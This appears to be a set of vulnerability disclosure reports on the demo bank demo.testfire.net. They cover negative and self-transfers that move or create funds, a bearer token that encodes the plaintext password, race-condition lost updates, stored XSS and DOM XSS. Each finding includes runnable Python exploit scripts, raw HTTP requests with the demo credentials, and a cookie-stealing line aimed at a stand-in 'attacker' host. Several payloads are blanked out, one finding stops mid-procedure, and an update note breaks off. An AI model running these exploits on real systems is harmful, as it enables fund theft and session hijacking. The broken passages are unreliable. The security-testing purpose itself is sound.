title: Negative transfer amount in POST /api/transfer reverses fund flow, allowing theft from arbitrary accounts
description: The REST endpoint `POST /api/transfer` does not validate the sign of `transferAmount`. A negative amount inverts the debit/credit, so a transfer "to" a third-party account actually removes funds from that account and credits the caller. The equivalent web endpoint (`POST /bank/doTransfer`) rejects negative amounts, so only the REST API is affected. The same endpoint also lacks any insufficient-funds or upper-bound validation.
impact: An authenticated user can move funds OUT of any third-party account by naming it as the destination and sending a negative `transferAmount`, crediting their own account. This is unauthorized modification of another customer's balance (funds theft) reachable without any special role. The absence of an amount bound additionally permits nonsensical balances and floating-point corruption of the ledger.
technical_analysis: `POST /api/transfer` parses `transferAmount` as a number but applies no sign, finiteness, or range validation. The transfer is implemented as "subtract amount from `fromAccount`, add amount to `toAccount`"; a negative amount therefore inverts the operation and debits the destination. The equivalent web `TransferServlet` performs the sign check (`if (!(amt > 0))` server-side equivalent returns "Transfer amount is invalid"), so the omission is specific to the REST layer. There is likewise no insufficient-funds check (a transfer larger than the balance succeeds and drives the balance negative) and no upper bound (values up to `1e30` are accepted), which is consistent with the amount being stored as a Java `double`.
poc_description:
1. Authenticate as `jsmith` via `POST /api/login` and capture the Bearer token.
2. Note the balances of an account the attacker controls (`fromAccount`, e.g. `800011`) and a victim account (`toAccount`, e.g. `800001`, not owned by the caller).
3. Send `POST /api/transfer` with body `{"toAccount":"800001","fromAccount":"800011","transferAmount":"-1"}` and the `Authorization: Bearer <token>` header.
4. Observe HTTP 200 with a success message.
5. Re-read both balances: the caller's account increased by 1 and the victim's account decreased by 1 — the negative amount reversed the intended direction.
6. For contrast, POST a negative amount to `/bank/doTransfer`; it is rejected with `ERROR: Transfer amount is invalid`.
poc_script_code:
```python
import requests, re

BASE = "http://demo.testfire.net"
tok = requests.post(BASE + "/api/login",
                    json={"username": "jsmith", "password": "demo1234"},
                    timeout=20).json()["Authorization"]
H = {"Authorization": "Bearer " + tok, "Content-Type": "application/json"}

def bal(acct):
    t = requests.get(BASE + "/api/account/" + acct, headers=H, timeout=20).text
    return re.search(r'"balance":"([^"]+)"', t).group(1)

before_victim, before_own = bal("800001"), bal("800011")

# negative amount "to" the victim actually steals FROM the victim
r = requests.post(BASE + "/api/transfer", headers=H,
                  json={"toAccount": "800001", "fromAccount": "800011",
                        "transferAmount": "-1"}, timeout=20)
print(r.status_code, r.text)                       # -> 200 {"success":"-1.0 was successfully transferred ..."}

print("victim 800001:", before_victim, "->", bal("800001"))   # decreased by 1
print("own    800011:", before_own,   "->", bal("800011"))    # increased by 1
```
remediation_steps: Reject any `transferAmount` that is not a finite number strictly greater than zero, and enforce a sane maximum and precision, on the server for both the REST API and the web servlet. Use a decimal/fixed-point money type rather than a binary double, and validate the parsed value (reject NaN/Infinity/overflow) before it reaches the ledger. As defence in depth, recompute the signed direction of the debit/credit from the validated positive amount rather than from a possibly-negative user value. Also enforce an insufficient-funds rule if overdrafts are not intended.
evidence:
Own controlled account `800011`, victim account `800001`, negative amount:

```http
POST /api/transfer HTTP/1.1
Host: demo.testfire.net
Authorization: Bearer <jsmith token>
Content-Type: application/json

{"toAccount":"800001","fromAccount":"800011","transferAmount":"-1"}
```

```http
HTTP/1.1 200 OK
{"success":"-1.0 was successfully transferred from Account 800011 into Account 800001 at 9/20/26 4:46 PM."}
```

Resulting balances (negative transfer reversed the flow — attacker gained, victim lost):

```text
800001 (victim): $1002626437452.38 -> $1002626437451.38   (delta -1.00)
800011 (own)   : $0.99             -> $1.99               (delta +1.00)
```

Web endpoint rejects the same input, proving the API gap:

```text
POST /bank/doTransfer  transferAmount=-25
-> ERROR: Transfer amount is invalid   (balances unchanged)
```

Supporting: no insufficient-funds or upper-bound check either —

```text
transfer 1,000,000 from an account holding $342   -> succeeded, balance became -$999,658.00
transfer 1e30 and 29-digit amounts                -> accepted (balance set to ~1e30)
```
assumptions: Assumes an authenticated account (jsmith/demo1234, documented default). Assumes the attacker knows or can enumerate the victim account number. No victim interaction required.
counterevidence: Checked whether a control neutralizes this: the web endpoint (`/bank/doTransfer`) rejects negative amounts with `ERROR: Transfer amount is invalid`, so the flaw is API-only — but the direct exploit was executed against `/api/transfer` and the balances moved, so the API path genuinely lacks the check. Confirmed the destination (800001) is a third-party account and that its balance decreased while the attacker's increased, ruling out a same-account/same-user artifact. No amount-sign validation, WAF, or secondary confirmation was observed on `/api/transfer`. The demo nature limits real-world financial impact, but the value-integrity invariant is demonstrably violated.
confidence_rationale: Reproduced live with concrete before/after balances on both sides; no execution gap.
severity_change_conditions: If the REST API were the only transfer path (or web clients also sent negative amounts through), impact would be the same; confirmation that the affected balances represent real value rather than synthetic demo data would raise severity. Adding a strict positive-amount validation would eliminate the issue.

title: API Bearer Token Embeds Reversible Credentials, Ignores Its Signature, and Survives Logout
description: The bearer token issued by `POST /api/login` is not an opaque session token. It is `base64(base64(username) + ":" + base64(password) + ":" + <eight random bytes>)`, so the account's plaintext password can be recovered by anyone who observes the token. The trailing eight bytes are not validated (a token with an empty or arbitrary trailing value is accepted), and `GET /api/logout` reports success without invalidating previously issued tokens, which therefore remain valid indefinitely.
impact: Any exposure of a token — through logs, browser history, an XSS payload, a referrer header, or an intermediary — discloses the user's plaintext password (not merely a session), enabling credential reuse against the web login. Because tokens are not revoked on logout and carry no expiry, a captured token (and the password it contains) remains usable after the user logs out, removing the ability to terminate a compromised session.
technical_analysis:
A successful `POST /api/login` returns a token whose structure is b64 of three colon-separated fields: base64(username), base64(password) and a short random suffix. Decoding the token from a normal `jsmith` login yields the literal credentials and an ignored suffix:

```
token  : YW5OdGFYUm86WkdWdGJ6RXlNelE9Oj8/bDA/
decode : anNtaXRo:ZGVtbzEyMzQ=:??l0?     ->  jsmith : demo1234 : <random>
```

Three independent weaknesses follow from this design:

1. **Reversible credentials.** `base64decode(token)` exposes `base64(username)` and `base64(password)`; base64 is not encryption, so the password is recovered directly. The recovered password was verified to work against the web login (`POST /doLogin`).

2. **No signature / integrity check.** Tokens minted with an empty or arbitrary suffix are accepted, so the trailing value provides no integrity guarantee:

```python
forge("jsmith", "demo1234", b"")            # empty suffix        -> 200
forge("jsmith", "demo1234", b"12345678")    # arbitrary suffix    -> 200
```

The password field itself *is* validated server-side (a token whose password field is wrong returns `401`), so the practical effect is that the token is a portable, reversible credential rather than a verifiable session artifact.

3. **No revocation.** After calling `GET /api/logout` (which returns `{"LoggedOut":"True"}`), the same token is still accepted by `GET /api/account` (`200`). Logging out of the web application (`/logout.jsp`) likewise does not invalidate an API token. The token contains no timestamp and there is no server-side token store, so there is no expiry and no way to revoke access.
poc_description:
1. Authenticate with valid credentials at `POST /api/login` and capture the returned `Authorization` token.
2. Base64-decode the token to obtain `<base64(username)>:<base64(password)>:<random>`; base64-decode the first two fields to recover the plaintext username and password.
3. Reuse the recovered username/password on the web login `POST /doLogin`; the login succeeds, proving the token discloses reusable credentials.
4. Build a token with an empty trailing field for the same user and send it to `GET /api/account`; the request is accepted (`200`), showing the suffix is not validated.
5. Call `GET /api/logout` with a token, then replay the same token against `GET /api/account`; it still returns the account list (`200`), showing logout does not revoke the token.
poc_script_code:
```python
import base64, requests

BASE = "http://demo.testfire.net"

def b64e(s): return base64.b64encode(s.encode()).decode()
def b64d(s):
    s = s.replace("\\/", "/")
    return base64.b64decode(s + "=" * ((4 - len(s) % 4) % 4))

def forge(user, password, suffix=b""):
    inner = b64e(user) + ":" + b64e(password) + ":" + suffix.decode("latin1")
    return base64.b64encode(inner.encode("latin1")).decode()

# 1. Obtain a token and recover the plaintext credentials.
tok = requests.post(BASE + "/api/login",
                    json={"username": "jsmith", "password": "demo1234"},
                    timeout=15).json()["Authorization"]
inner = b64d(tok).decode("latin1")
u_b64, p_b64, suffix = inner.split(":")
user, pw = b64d(u_b64).decode(), b64d(p_b64).decode()
print("recovered credentials:", user, pw)

# 2. Recovered password works on the web login.
r = requests.post(BASE + "/doLogin",
                  data={"uid": user, "passw": pw, "btnSubmit": "Login"},
                  allow_redirects=False, timeout=15)
print("web login with recovered creds:", r.status_code, r.headers.get("Location"))

# 3. Token with an empty signature field is accepted.
r2 = requests.get(BASE + "/api/account",
                  headers={"Authorization": "Bearer " + forge("jsmith", "demo1234")},
                  timeout=15)
print("forged (empty suffix):", r2.status_code)

# 4. Logout does not invalidate the token.
requests.get(BASE + "/api/logout",
             headers={"Authorization": "Bearer " + tok}, timeout=15)
r3 = requests.get(BASE + "/api/account",
                  headers={"Authorization": "Bearer " + tok}, timeout=15)
print("token valid after logout:", r3.status_code)
```
remediation_steps: Stop encoding credentials into the token. Issue an opaque, high-entropy random session identifier (or a properly signed JWT using a server-held key) that contains no username or password material. Store session state server-side with an explicit expiry and a revocation list, and invalidate the session record in the logout handler so that logout truly terminates the session. If a self-contained signed token is used, verify the signature and expiry on every request and reject tokens whose signature does not validate; never accept a token with a missing or malformed signature.
evidence:
Token decodes to plaintext credentials:

```text
token  : YW5OdGFYUm86WkdWdGJ6RXlNelE9Oj8/bDA/
decode : anNtaXRo:ZGVtbzEyMzQ=:??l0?
fields : jsmith : demo1234 : <random 8 bytes>
```

Recovered password succeeds on the web login:

```http
POST /doLogin HTTP/1.1
Content-Type: application/x-www-form-urlencoded

uid=jsmith&passw=demo1234&btnSubmit=Login
-> HTTP/1.1 302 Found
   Location: /bank/main.jsp
```

Tokens with a missing or arbitrary signature field are accepted (`GET /api/account`):

```text
forge("jsmith","demo1234", b"")        -> 200 OK (account list returned)
forge("jsmith","demo1234", b"12345678")-> 200 OK (account list returned)
forge("jsmith","WRONGPASS")            -> 401 loggedIn=false  (password still checked)
```

Logout does not revoke:

```http
GET /api/logout  (Authorization: Bearer <tok>)  -> 200 {"LoggedOut":"True"}
GET /api/account (Authorization: Bearer <tok>)  -> 200 (account list still returned)
```
assumptions: Assumes an attacker can observe a token by some means (log capture, an XSS payload reading client-side storage, an intermediary, or a referrer leak). No direct token-theft vector is demonstrated in this report; the finding is the weakness of the token itself once exposed.
counterevidence: Actively tested whether the weak structure enables a true authentication bypass: a forged token whose password field is wrong is rejected (`401`), so the server does re-validate the decoded credentials and a pure "forge without credentials" bypass is not available (that route is the separate SQL-injection finding). The trailing 8 bytes being unvalidated therefore does not, by itself, grant access without valid credentials. What remains is that the token is a reversible credential with no expiry and no revocation. Severity is kept at Low because exploitation requires the attacker to already hold a token; there is no demonstrated acquisition path in this report.
severity_change_conditions: Demonstrating a concrete token-acquisition vector (for example a reflected/stored XSS that reads the token, or token leakage via referrer/logs that an unauthenticated attacker can trigger) would raise this to Medium/High by removing the "attacker already holds the token" precondition.

title: Self-transfer (fromAccount equal to toAccount) creates funds instead of being a no-op
description: The fund-transfer operation credits the destination account but does not debit the source when both accounts are the same. Because the server does not enforce that `fromAccount` differs from `toAccount` (only the browser JavaScript does), an attacker can repeatedly "transfer" an amount to the same account and increase its balance without any source of funds. This affects both the web endpoint `POST /bank/doTransfer` and the REST endpoint `POST /api/transfer`.
impact: An authenticated user can mint unlimited funds into any account they can name as both source and destination, effectively setting the balance to an arbitrary value. This breaks conservation of value in the ledger: money is created from nothing, transactions are recorded as successful, and the resulting balance is durable and visible through all account views. It undermines the integrity of every downstream financial computation.
technical_analysis: The transfer routine reads the source and destination balances and writes `source = source - amount` and `destination = destination + amount`. When both identifiers refer to the same account row, the two writes target one row and the final value reflects the credit (`+amount`) rather than a net zero, so the balance increases by the full amount with no corresponding debit. The only guard against `fromAccount == toAccount` lives in client-side JavaScript (`transfer.jsp` `confirminput`: "From Account and To Account fields cannot be the same"); the server performs no such check, so a direct HTTP request with identical source and destination is accepted. The same backend is shared by the web `TransferServlet` and the REST `/api/transfer` handler, so both are affected.
poc_description:
1. Authenticate as `jsmith` via `POST /doLogin` (web) or `POST /api/login` (API).
2. Pick any account the user can reference, e.g. `800023`, and record its balance via `GET /api/account/800023`.
3. Send a transfer where the source and destination are the SAME account: `POST /bank/doTransfer` with `fromAccount=800023&toAccount=800023&transferAmount=100` (or `POST /api/transfer` with the equivalent JSON body).
4. Observe HTTP 200 and a success message.

title: Stored XSS via /admin/addUser username rendered in /admin/admin.jsp (cross-user confirmed)
description: A username created through the admin "Add User" function is stored and later rendered without encoding in `/admin/admin.jsp`. Cross-user execution is confirmed: a payload stored by one authenticated account executes in a **different** account's session as soon as that user opens the admin console. Because the console is reachable by any authenticated user, not only administrators, a low-privilege attacker can persist script that fires in every user's session — including more privileged ones.
impact: The payload is persistent: once stored it executes every time any authenticated user opens `/admin/admin.jsp`, in that viewer's own session. Cross-user execution was demonstrated end to end with two independent accounts — the payload was stored by account A and fired in account B's session, which never touched the Add User function. The hosting console page renders the plaintext `username:password:role` of every account in the `PEOPLE` table, so the stored script can silently exfiltrate that credential material, read whatever the victim's session can read, and drive privileged user-management operations (create users, change passwords) as the victim. This turns a stored value into session-riding and account-takeover capability inside other users' authenticated sessions.
technical_analysis: `POST /admin/addUser` stores the supplied `username` verbatim in the database (`DBUtil.addUser`, `INSERT INTO PEOPLE (...))`. `/admin/admin.jsp` builds two ` ... ``` The same construct is repeated for the Change Password form at lines 124-126. A username such as `` is therefore emitted raw; in the text-content position the `` is parsed as a real element and its `onerror` handler executes on every page load. There is no output encoding, no CSP and no `X-XSS-Protection`. Cross-user reachability: `getBankUsers()` returns **all** rows regardless of the viewer, so the stored value is emitted on every load of the console by **any** authenticated session. `/admin/*` is protected only by the login `AuthFilter`; the role-checking `AdminFilter` is not effective on this path, so any authenticated user — attacker or victim — reaches both `addUser` and `admin.jsp`. The lack of any per-session filtering is what makes the payload execute in a *different* user's session, as verified below.
poc_description: Two independent authenticated accounts are used: the attacker account stores the payload, and a second, unrelated victim account is the one in whose session the payload fires. 1. Log in as the low-privilege attacker account (`jsmith`). 2. Store the payload as a username by submitting the Add User form to `POST /admin/addUser` with `username=`. 3. Confirm the payload is now served unencoded by `GET /admin/admin.jsp`. 4. Create a second, unrelated account through the same function, using an all-lowercase password (the login servlet lower-cases the submitted password before the credential check, so a mixed-case password would never authenticate). 5. Log in as the second account in a clean browser session and open `/admin/admin.jsp`. 6. Observe that the stored payload executes in the second account's session: `window.__storedXss` is `778899`, and the injected `` element is present in the live DOM. 7. Replace the side effect with `new Image().src='//attacker/'+document.cookie` or a state-changing request to turn the execution into session riding / account takeover.
poc_script_code: ```python import requests BASE = "http://demo.testfire.net" def login(uid, pw): s = requests.Session() s.post(f"{BASE}/doLogin", data={"uid": uid, "passw": pw, "btnSubmit": "Login"}) return s # --- Account A: any authenticated low-privilege user (attacker) --- attacker = login("jsmith", "demo1234") # Store the payload as a username (any authenticated user can reach this) payload = "" attacker.post(f"{BASE}/admin/addUser", data={"firstname": "f", "lastname": "l", "username": payload, "password1": "lowercase1", "password2": "lowercase1", "add": "Add User"}) # Create a second, unrelated account. Password MUST be all lower-case, # because /doLogin applies password.trim().toLowerCase() before the check. attacker.post(f"{BASE}/admin/addUser", data={"firstname": "victim", "lastname": "user", "username": "victimaccount", "password1": "victimpw", "password2": "victimpw", "add": "Add User"}) # --- Account B: the victim, a different user --- victim = login("victimaccount", "victimpw") # The victim simply opens the console; the payload stored by Account A # is served into Account B's session and executes there. r = victim.get(f"{BASE}/admin/admin.jsp") assert "window.__storedXss=778899" in r.text print("payload stored by account A was served to account B's session") # Browser confirmation (Account B session): # window.__storedXss === 778899 # document.querySelectorAll('img[onerror]').length > 0 ```
remediation_steps: HTML-entity-encode all stored user fields (especially `username`) wherever they are rendered, using context-appropriate encoding for attribute and text positions; prefer the templating engine's automatic escaping. Enforce a real role check on `/admin/*` (fix the `AdminFilter` path mapping) so only administrators reach the console, and validate usernames against an allow-list (e.g. alphanumerics/`.`/`_`/`-`). Add a restrictive `Content-Security-Policy` as defence in depth.
evidence: Payload stored by the attacker account (authenticated `POST /admin/addUser`): ```http POST /admin/addUser HTTP/1.1 Host: demo.testfire.net Content-Type: application/x-www-form-urlencoded username=%3Cimg+src%3Dx+onerror%3Dwindow.__storedXss%3D778899%3E&password1=zz9pw&password2=zz9pw&firstname=rg&lastname=x&add=Add+User ``` It persists and is returned unencoded by the console: ```html ``` The payload is served to a **different** authenticated session (Account B, `GET /admin/admin.jsp`): ```http HTTP/1.1 200 OK ... window.__storedXss=778899 ... (present twice) ``` Execution in Account B's browser session (Account B never used the Add User function) — evaluated live in the loaded page: ``` > window.__storedXss 778899 > JSON.stringify({title:document.title, xss:window.__storedXss, onerrorImgs:document.querySelectorAll('img[onerror]').length}) "{\"title\":\"13\",\"xss\":778899,\"onerrorImgs\":6}" ``` The page's own title was also rewritten to `13` by an independently stored payload, and six attacker-controlled `` elements were present in the live DOM — all evidence that stored usernames are parsed and their handlers executed in the victim's session. A control check confirms the account really is a distinct, authenticated user: `GET /admin/admin.jsp` without a session returns `302 -> /login.jsp`.
assumptions: Requires one authenticated account to store the payload (any logged-in user can reach the ineffective admin path) and a distinct authenticated victim who opens `/admin/admin.jsp`. The victim account must be created with an all-lowercase password because the login servlet lower-cases the submitted password. Data is the application's synthetic demo data.
counterevidence: The original strongest objection — that execution was only seen in the storing user's own session — is now removed: a second, unrelated account created with an all-lowercase password authenticated successfully and the stored payload executed in its session, with no interaction beyond opening the console. Remaining constraints: the victim must be lured to `/admin/admin.jsp`, which is not the default landing page, so the viewer population is limited to users who open the admin console; and the discrete capabilities the payload can invoke (credential dump, user creation, password change) are already reachable by any authenticated user through separate authorization defects, so the marginal impact of the XSS itself is session riding and silent exfiltration in the victim's identity rather than access that is otherwise impossible. No output encoding, CSP, `X-XSS-Protection` or per-session filtering was found on the render path; the payload was verified to execute in a current browser engine.
severity_change_conditions: Evidence that a distinct, more-privileged account (a true administrator) routinely opens `/admin/admin.jsp` and is served the payload would further strengthen the impact; conversely, if the console required a dedicated administrator role that low-privilege users cannot obtain, both storage and victim population would shrink and severity would drop toward medium.

update_history.reason: Cross-user execution of the stored payload is now confirmed with a second independent account. Previously the finding was only observed in the session that stored the payload, and the report's counterevidence explicitly flagged that a second valid login could not be obtained. A second account was created with an all-lowercase password (the login servlet lower-cases the submitted password before the credential check, so mixed-case tool-created accounts never authenticate), the victim session open

title: Race condition (non-atomic balance read-modify-write) on POST /api/transfer causes lost updates despite HTTP 200 successes
description: Fund transfers on `POST /api/transfer` are implemented as a non-atomic read-modify-write of account balances. When multiple transfers are submitted concurrently, they overwrite each other's balance updates, so many transfers that each return HTTP 200 "success" are silently lost. The number of applied transfers no longer matches the number of successful responses, producing an inconsistent ledger.
impact: Transfers acknowledged as successful are silently dropped, so account balances are inconsistent with their transaction history and with the responses returned to clients. A user or automated client that issues transfers under load (including retries) can end up with a ledger that does not reflect the actions reported as completed, undermining financial-record integrity and auditability. Under some interleavings the debit and credit sides diverge slightly, which in a real system would create small reconciliation discrepancies.
technical_analysis: The transfer handler reads the current balances of the source and destination accounts, computes new values in application memory, and writes them back. There is no row locking, no atomic `balance = balance +/- amount` update, and no optimistic-concurrency (version/ETag) check. When N requests run concurrently they all read the same pre-update balance and write back based on that stale snapshot, so the writes clobber one another: the final balance reflects only the last few writers even though every request returned success. This is the same non-atomic read-modify-write that also underlies the self-transfer funds-creation defect. The window is wide — no synchronization primitive or precise timing is needed; plain parallel requests reproduce it.
poc_description:
1. Authenticate as `jsmith` via `POST /api/login` and capture the token.
2. Record the balances of two accounts (e.g. `800013` and `800019`).
3. Baseline: send 30 transfers of `$1` from `800013` to `800019` sequentially; each returns 200 and both balances move by exactly 30.
4. Re-baseline, then send the identical 30 transfers concurrently (e.g. with asyncio/aiohttp); all 30 return HTTP 200 success.
5. Re-read the balances: far fewer than 30 were applied (observed ~2–4), demonstrating the lost updates.
6. Repeat to confirm the delta is consistently far below the number of successful responses.
poc_script_code:
```python
import asyncio, json, re, aiohttp
from decimal import Decimal

BASE = "http://demo.testfire.net"
SRC, DST, AMT, N = "800013", "800019", "1", 30

login = None
async def main():
    global login
    async with aiohttp.ClientSession(trust_env=False) as s:
        login = (await (await s.post(BASE + "/api/login",
                    json={"username": "jsmith", "password": "demo1234"})).json())["Authorization"]
    H = {"Authorization": "Bearer " + login, "Content-Type": "application/json"}

    async def bal(s, a):
        t = await (await s.get(BASE + f"/api/account/{a}",
                    headers={"Authorization": "Bearer " + login})).text()
        return Decimal(re.search(r'"balance":"([^"]+)"', t).group(1).replace("$", "").replace(",", ""))

    async def xfer(s):
        body = json.dumps({"toAccount": DST, "fromAccount": SRC, "transferAmount": AMT})
        return (await s.post(BASE + "/api/transfer", headers=H, data=body)).status

    async with aiohttp.ClientSession(trust_env=False) as s:
        b_src, b_dst = await bal(s, SRC), await bal(s, DST)
        st = await asyncio.gather(*[xfer(s) for _ in range(N)])   # concurrent
        a_src, a_dst = await bal(s, SRC), await bal(s, DST)
        print("ok:", sum(1 for x in st if x == 200), "/", N)
        print("src delta:", a_src - b_src, " (expected -30)")
        print("dst delta:", a_dst - b_dst, " (expected +30)")

asyncio.run(main())
```
remediation_steps: Make balance updates atomic and serialized. Perform each transfer in a single database transaction using atomic balance mutations (e.g. `UPDATE accounts SET balance = balance - ? WHERE account_id = ?` and `SET balance = balance + ?` inside one transaction) rather than read-compute-write, or apply row-level locking / `SELECT ... FOR UPDATE` on the affected rows for the duration of the transfer. Where optimistic concurrency is used, enforce a version/ETag check and retry on conflict so no acknowledged update is lost. Ensure the success response is only returned after the transaction commits.
evidence:
Controlled comparison on the same account pair (`800013` -> `800019`) and amount (`$1`), balances read via `GET /api/account/{no}`:

```text
SEQUENTIAL 30 transfers: 800013 54888882.99 -> 54888852.99 (delta -30.00)
                         800019 678886648.99 -> 678886678.99 (delta +30.00)   ok=30/30
CONCURRENT 30 transfers: 800013 54888851.99 -> 54888849.99 (delta  -2.00)
                         800019 678886679.99 -> 678886682.99 (delta  +3.00)   ok=30/30
CONCURRENT 60 transfers: applied ~3 of 60 (ok counter affected by client socket limits)
```

The 30 concurrent requests each received:

```http
HTTP/1.1 200 OK
{"success":"1.0 was successfully transferred from Account 800013 into Account 800019 ..."}
```

yet only ~2–4 units actually moved — the ledger reflects a fraction of the acknowledged transfers.
assumptions: Assumes an authenticated user (jsmith/demo1234). The race requires only the ability to issue parallel requests — no special timing, privileged access, or victim interaction. No synchronization primitive is needed; ordinary concurrent HTTP requests reproduce it.
counterevidence: Argued the other side: could the reduced delta be a client/measurement artifact rather than a server-side lost update? Ruled out by the sequential-vs-concurrent contrast on the identical account pair and amount — 30 sequential requests applied exactly (-30/+30), while 30 concurrent requests with the same inputs applied only ~2-4, and every concurrent request returned HTTP 200 with a success message from the server. The delta was measured by re-reading balances through an independent endpoint after all requests completed, so it is not a read-timing artifact. No server-side locking, optimistic-concurrency (ETag/version) check, or serialization was observed; the same read-modify-write is the mechanism behind the separately confirmed self-transfer defect. Impact is limited to integrity/inconsistency (funds are not created for the attacker), which is why severity is moderate rather than high.
severity_change_conditions: If concurrency could be shown to create or destroy value asymmetrically for the attacker (rather than merely losing updates), severity would rise to high; confirming that balances are reconciled from a source of truth would lower it. The finding is currently rated on demonstrated ledger inconsistency only.

title: DOM-Based XSS and Open Redirect via the url Parameter in /disclaimer.htm
description: The `disclaimer.htm` page takes the entire substring after `url=` from its own address and assigns it directly to `window.location.href` when the user clicks the "OK" image. The value is not validated against a scheme or host allowlist, so an attacker can supply `javascript:` URIs, which execute script in the demo.testfire.net origin, or an arbitrary external URL that redirects the user off-site.
impact: Script supplied through the `url` parameter runs in the application's origin after a single click, letting an attacker act as the victim: read the non-HttpOnly `AltoroAccounts` cookie, issue authenticated same-origin requests (for example perform transfers or account actions), and render arbitrary content under the bank's domain for phishing. The same parameter also performs an unvalidated redirect to an arbitrary external host, enabling phishing and the theft of tokens/referrers on the trusted domain.
poc_description:
1. Deliver the crafted link `http://demo.testfire.net/disclaimer.htm?url=javascript:document.title=1` to a victim.
2. The victim lands on the trusted disclaimer page and clicks the "OK" image.
3. `go()` assigns the `url` value to `window.location.href`; the `javascript:` payload executes and the document title becomes `1`.
4. To demonstrate code execution with a side effect that survives the encoded URL, use `?url=javascript:document.body.setAttribute%28%27data-y%27%2C%27OK9%27%29`; after clicking OK the attribute `data-y="OK9"` is present on the body, proving arbitrary script execution in the page origin.
5. For the redirect variant, browse to `http://demo.testfire.net/disclaimer.htm?url=http://example.com/` and click OK; the browser navigates to `https://example.com/`.
poc_script_code:
```html

Please confirm

Open trusted page Open redirect ``` ```python # Verification of the executed payloads against a running instance # (the javascript: sink requires the browser to click "OK"; use a headless browser). from urllib.parse import quote BASE = "http://demo.testfire.net/disclaimer.htm?url=" # Executes JS in the demo.testfire.net origin once the user clicks OK. xss_payload = quote("javascript:document.body.setAttribute('data-y','OK9')", safe="") print(BASE + xss_payload) # Unvalidated redirect to an arbitrary external host. print(BASE + "http://example.com/") ```
remediation_steps: Do not assign user-controlled input to `window.location.href`. Validate the destination against a strict allowlist: accept only absolute `https:` URLs whose host is an expected destination, reject all other schemes (`javascript:`, `data:`, `vbscript:`) and protocol-relative values, and compare the parsed host (after canonicalization) rather than a substring. Where only known links are expected, map link identifiers to fixed destinations server-side instead of passing the target in the URL. Add a Content-Security-Policy that disallows inline script to further reduce the impact of any residual DOM injection.
evidence:
After clicking the "OK" image on the crafted page, script executed in the origin (document title changed from the page title to `1`):

```text
GET /disclaimer.htm?url=javascript:document.title=1
(browser title) Altoro Mutual: Link Disclaimer  ->  after clicking OK: "1"
```

Arbitrary DOM mutation through the encoded payload, proving general script execution (not just a title side effect):

```text
GET /disclaimer.htm?url=javascript:document.body.setAttribute%28%27data-y%27%2C%27OK9%27%29
click OK
document.body.getAttribute('data-y')  ->  "OK9"
```

Unvalidated cross-origin redirect (same sink, `http:` scheme):

```text
GET /disclaimer.htm?url=http://example.com/
click OK
final URL   -> https://example.com/
page title  -> Example Domain
```
assumptions: Assumes the victim follows a crafted link to the trusted `demo.testfire.net` domain and clicks the "OK" image on the disclaimer page (one user interaction). No authentication is required to reach the page.
counterevidence: Checked whether the reflection in the page body is the actual sink: the body uses `document.write(encodeURI(sDst))`, which percent-encodes `<` and `>`, so a raw HTML/XSS payload there does not execute and the body reflection is not exploitable — the execution is specifically via the `location.href` assignment. Also verified the scheme cannot be assumed safe: `javascript:` does not match the `sDst.indexOf("http")==0` auto-redirect branch, yet still reaches the `location.href` sink, so the only guard (hostname substring for same-domain http links) does not cover it. Confirmed execution is not a side effect of test tooling — the standard `location.href='javascript:...'` assignment executed (attribute set to `MARKER123`), and the real OK-button path executed for both payloads. The residual constraint is the required click (UI:R), reflected in the rating.
severity_change_conditions: Removing the required click (for example if a version auto-navigates for these values) would raise this to a zero-interaction reflected XSS (higher severity); conversely, restricting the sink to same-origin http links with a strict scheme check would remove the javascript: execution and leave at most a low-severity open redirect.
